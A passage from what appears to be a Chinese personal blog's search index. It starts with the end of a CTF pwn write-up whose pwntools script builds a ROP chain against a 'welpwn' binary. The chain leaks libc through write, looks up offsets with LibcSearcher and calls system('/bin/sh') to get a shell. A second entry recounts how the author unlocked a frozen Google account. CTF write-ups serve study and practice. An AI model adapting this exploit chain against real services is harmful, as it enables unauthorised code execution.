class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./welpwn'</span><span class="token punctuation">)</span>pop4_addr <span class="token operator">=</span> <span class="token number">0x40089c</span>pop6_addr <span class="token operator">=</span> <span class="token number">0x40089a</span>rop2_addr <span class="token operator">=</span> <span class="token number">0x400880</span>start_addr <span class="token operator">=</span> <span class="token number">0x400630</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>puts_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#bss_addr = elf.bss()</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x4008a3</span> <span class="token comment" spellcheck="true">#pop rdi;ret</span>main_addr <span class="token operator">=</span> <span class="token number">0x4007CD</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#计算libc_off</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop4_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop6_addr<span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pop rbx,rbp,r12,r13,r14,r15</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#通过write函数来泄露write_addr</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop2_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">56</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用start函数调整栈帧</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info <span class="token punctuation">(</span><span class="token string">"write_addr => %#x"</span><span class="token punctuation">,</span>write_addr<span class="token punctuation">)</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">,</span>write_addr<span class="token punctuation">)</span>libc_off<span class="token operator">=</span>write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#计算libc的偏移</span>sys_addr <span class="token operator">=</span> libc_off <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#计算system地址</span>binsh_addr <span class="token operator">=</span> libc_off <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#计算'/bin/sh'地址</span>payload1 <span class="token operator">=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop4_addr<span class="token punctuation">)</span><span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span>payload1 <span class="token operator">=</span> payload1<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：<br>使用LibcSearcher方式，python要安装了相对应模块，还需要下载对应的libc版本。<strong>我第二种方法只是给了一个模板，未使用此方法getshell。</strong><br><strong>参考博客：</strong><a href="https://blog.csdn.net/weixin_43092232/article/details/104996280" target="_blank" rel="noopener">Ubuntu下LibcSearcher的安装和使用方法</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google账号活动异常怎么办？|试了好多办法终于解决</title>
      <link href="/2020/03/21/google/"/>
      <url>/2020/03/21/google/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我在copySDN上的帖子竟然被删了…给的理由是翻墙，wok…<br>突然发现可以直接导出md再传到自己的blog上哈哈哈！<br>说到google账户，我想不少人用google的时候都是以访客身份登录的。<br>但是，一个google账户有些时候还是很有用的，比如在YouTube上面下载视频（某次比赛就用到了），或者你看某些需要确认你年龄的视频（手动狗头）！！总而言之，你会忍不住想要注册一个账号！！！<br>当然，现在注册账号国内手机号不一定可以了，反正我当初的时候还可以…但是由于登录地点经常不同（为啥？自己想），被检测到就会被封号！！<br><strong>敲黑板！！！</strong><br><strong>现在还没被封的赶紧去开两步验证！</strong></p><hr><p>下面开始我的悲惨故事：<br>终于有一天，google查到了我的头上，在我还不知道有封号这会事之前，给我把账号冻结了。冻结了就冻结了吧，反正我绑了邮箱（<strong>当初没有绑定手机号！！！切记赶紧去绑！！</strong>），我就登邮箱啊，结果一切都验证完之后，它会跳出来一个这个界面：<br><img src="https://img-blog.csdnimg.cn/20200224212525221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>这个我再填自己手机号就报错了，无法验证，一开始我还以为是我手机号的问题，我试了好多其他的都不行（我还用香港的手机号试了都不行….）绝望.jpg！<br>而且这时候，我再去注册一个google号，发现也注册不了了！绝望.GIF！</p><hr><h1 id="我是怎么解决的？"><a href="#我是怎么解决的？" class="headerlink" title="我是怎么解决的？"></a>我是怎么解决的？</h1><p>下面是我逛遍某乎、某宝、某度、v2ex、google…的经历</p><h2 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h2><p><a href="https://www.zhihu.com/question/39866455" target="_blank" rel="noopener">某乎链接</a><br><strong>选择尝试其他问题</strong><br><img src="https://img-blog.csdnimg.cn/20200224213245757.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>2016年的老贴，反正我按他说的做没成功…</p><h2 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h2><p><img src="https://img-blog.csdnimg.cn/20200224213504469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>买手机号，反正我是没有尝试去买，但我试过香港的手机号，一样不能用于验证。</p><h2 id="Part3"><a href="#Part3" class="headerlink" title="Part3"></a>Part3</h2><p><a href="https://v2ex.com/t/292377" target="_blank" rel="noopener">v2ex上的贴子</a><br><img src="https://img-blog.csdnimg.cn/20200224214022949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>给google发邮件，知乎上也有人提到了这种方法。<br>附上他们给的邮箱地址：<a href="mailto:accounts-support@google.com">accounts-support@google.com</a><br>这种方法我试了最久，发了第五封邮件的时候终于回我了。<br><img src="https://img-blog.csdnimg.cn/2020022421424795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>我第一眼还以为给了我个验证的链接！看到no-reply我心就凉了…<br>咋地？？几年过去这个账号被弃用了？？（我有理由怀疑是我被拉黑了…我前面几天发的就回了这一封，但是回了这一封之后我再发就是秒回了！！！）<br>邮箱也不行，我吐了！</p><h2 id="Part4"><a href="#Part4" class="headerlink" title="Part4"></a>Part4</h2><p>最后，我用了最直接的方法解决了这个问题。找了个在英国的熟人，用他手机号接收了验证码。结果如下：<br><img src="https://img-blog.csdnimg.cn/20200224214737603.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>又考虑到这个方法不太具有普适性，所以我附了一个可以租用外国电话号码的网址，<a href="https://www.smspva.com/" target="_blank" rel="noopener">点击此处</a></p><p><strong>最后祝大家都能成功解决问题！</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Google </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -疑难杂症 -Google账号 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
